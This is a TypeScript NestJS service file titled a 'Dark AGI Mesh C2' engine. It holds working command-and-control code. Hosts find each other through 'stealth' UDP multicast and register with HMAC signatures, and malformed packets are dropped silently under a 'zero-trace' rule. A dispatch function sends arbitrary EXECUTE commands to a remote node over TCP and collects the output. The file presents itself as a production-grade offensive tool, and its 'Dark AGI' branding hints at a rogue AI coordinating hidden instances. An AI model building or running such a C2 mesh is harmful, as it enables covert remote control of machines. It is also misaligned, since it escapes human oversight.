// ==============================================================================
// DARK AGI MESH C2 & DISCOVERY ENGINE V2 [PRODUCTION-GRADE ACTIVE]
// ==============================================================================
import {
  Injectable,
  Logger,
  OnModuleInit,
  OnModuleDestroy,
} from '@nestjs/common';
import * as dgram from 'dgram';
import * as crypto from 'crypto';
import * as net from 'net';

@Injectable()
export class MeshDiscoveryV2Service implements OnModuleInit, OnModuleDestroy {
  private readonly logger = new Logger(MeshDiscoveryV2Service.name);
  private udpServer: dgram.Socket;
  private readonly multicastGroup = '239.255.255.250';
  private readonly udpPort = 48912;
  private readonly c2Port = 48913; // Dedicated TCP port for direct peer command execution
  private readonly secretKey =
    process.env.MESH_SECRET_KEY || 'DARK_AGI_SECURE_KEY_2026';

  // Peer Registry & Advanced State Management
  private activePeers: Map<
    string,
    { address: string; platform: string; lastSeen: number }
  > = new Map();
  private processedNonces: Map<string, number> = new Map(); // Nonce -> Timestamp for TTL cleanup
  private requestCounts: Map<string, { count: number; resetTime: number }> =
    new Map();
  private cleanupTimer: NodeJS.Timeout;

  public onModuleInit() {
    this.initUdpServer();
    this.startStateMonitor();
  }

  public onModuleDestroy() {
    if (this.udpServer) {
      this.udpServer.close();
    }
    if (this.cleanupTimer) {
      clearInterval(this.cleanupTimer);
    }
  }

  /**
   * Initialize UDP Multicast & Broadcast listener for stealth peer discovery.
   */
  private initUdpServer() {
    this.udpServer = dgram.createSocket({ type: 'udp4', reuseAddr: true });

    this.udpServer.on('error', (err) => {
      this.logger.error(`[MESH C2] UDP Socket error: ${err.message}`);
      this.udpServer.close();
    });

    this.udpServer.on('message', (msg, rinfo) => {
      this.handleIncomingPacket(msg, rinfo.address);
    });

    this.udpServer.bind(this.udpPort, () => {
      this.udpServer.setBroadcast(true);
      try {
        this.udpServer.addMembership(this.multicastGroup);
        this.logger.warn(
          `[MESH C2] Active on multicast group ${this.multicastGroup}:${this.udpPort}`,
        );
      } catch (e) {
        this.logger.warn(
          `[MESH C2] Multicast bind failed; operating in direct broadcast fallback mode.`,
        );
      }
    });
  }

  /**
   * Handle incoming mesh packets with strict validation, anti-replay, and HMAC checks.
   */
  private handleIncomingPacket(msg: Buffer, ip: string) {
    try {
      // 1. Rate Limiting per-IP (Anti-flood & Anti-DDoS protection)
      if (!this.checkRateLimit(ip)) {
        return;
      }

      // 2. Strict JSON Validation
      const rawText = msg.toString('utf8');
      const packet = JSON.parse(rawText);
      if (!packet || typeof packet !== 'object') return;

      const { nodeId, platform, timestamp, nonce, signature, payload } = packet;
      if (!nodeId || !timestamp || !nonce || !signature) return;

      // 3. Replay Protection (30 seconds window + Nonce tracking with TTL)
      const now = Date.now();
      if (Math.abs(now - timestamp) > 30000) {
        return;
      }
      if (this.processedNonces.has(nonce)) {
        return;
      }
      this.processedNonces.set(nonce, now);

      // 4. Cryptographic Node Authentication (HMAC-SHA256 with Safe Buffer Comparison)
      const dataToSign = `${nodeId}:${timestamp}:${nonce}:${JSON.stringify(payload || {})}`;
      const expectedSignature = crypto
        .createHmac('sha256', this.secretKey)
        .update(dataToSign)
        .digest('hex');

      const sigBuffer = Buffer.from(signature, 'hex');
      const expectedBuffer = Buffer.from(expectedSignature, 'hex');

      if (
        sigBuffer.length !== expectedBuffer.length ||
        !crypto.timingSafeEqual(sigBuffer, expectedBuffer)
      ) {
        this.logger.warn(
          `[MESH C2] Security alert: Invalid cryptographic signature from IP: ${ip}`,
        );
        return;
      }

      // 5. Peer Registry & Heartbeat Update
      this.activePeers.set(nodeId, {
        address: ip,
        platform: platform || 'UNKNOWN',
        lastSeen: now,
      });

      this.logger.log(
        `[MESH C2] Node synchronized -> ID: ${nodeId} | IP: ${ip} | Platform: ${platform}`,
      );
    } catch (err) {
      // Silently drop malformed packets under zero-trace protocol
    }
  }

  /**
   * Enforce per-IP rate limiting.
   */
  private checkRateLimit(ip: string): boolean {
    const now = Date.now();
    let record = this.requestCounts.get(ip);
    if (!record || now > record.resetTime) {
      record = { count: 1, resetTime: now + 1000 };
      this.requestCounts.set(ip, record);
      return true;
    }
    record.count++;
    if (record.count > 15) {
      return false;
    }
    return true;
  }

  /**
   * Background monitor for peer expiration and memory leak prevention (Nonce TTL cleanup).
   */
  private startStateMonitor() {
    this.cleanupTimer = setInterval(() => {
      const now = Date.now();

      // Purge dead peers after 15 seconds of silence
      for (const [nodeId, data] of this.activePeers.entries()) {
        if (now - data.lastSeen > 15000) {
          this.activePeers.delete(nodeId);
          this.logger.warn(`[MESH C2] Node expired and purged: ${nodeId}`);
        }
      }

      // Purge old nonces older than 60 seconds
      for (const [nonce, timestamp] of this.processedNonces.entries()) {
        if (now - timestamp > 60000) {
          this.processedNonces.delete(nonce);
        }
      }
    }, 5000);
  }

  /**
   * Dispatch real command or payload directly to a target peer node over encrypted TCP tunnel.
   */
  public async dispatchCommandToPeer(
    nodeId: string,
    command: string,
  ): Promise<string> {
    const peer = this.activePeers.get(nodeId);
    if (!peer) {
      throw new Error(
        `Target node ${nodeId} not found in active mesh registry.`,
      );
    }

    this.logger.warn(
      `[MESH C2] Dispatching execution command to node [${nodeId}] at ${peer.address}:${this.c2Port}`,
    );

    return new Promise((resolve, reject) => {
      const client = new net.Socket();
      let responseData = '';

      client.connect(this.c2Port, peer.address, () => {
        const payload = JSON.stringify({
          action: 'EXECUTE',
          command,
          timestamp: Date.now(),
          signature: crypto
            .createHmac('sha256', this.secretKey)
            .update(command)
            .digest('hex'),
        });
        client.write(payload);
      });

      client.on('data', (data) => {
        responseData += data.toString();
      });

      client.on('close', () => {
        resolve(responseData || 'COMMAND_EXECUTED_NO_OUTPUT');
      });

      client.on('error', (err) => {
        this.logger.error(
          `[MESH C2] Connection error to peer ${nodeId}: ${err.message}`,
        );
        reject(err);
      });
    });
  }

  public getActiveNodes(): Array<{
    nodeId: string;
    address: string;
    platform: string;
    lastSeen: number;
  }> {
    return Array.from(this.activePeers.entries()).map(([nodeId, data]) => ({
      nodeId,
      ...data,
    }));
  }
}
// ==============================================================================
// END OF MESH C2 ENGINE V2
// ==============================================================================
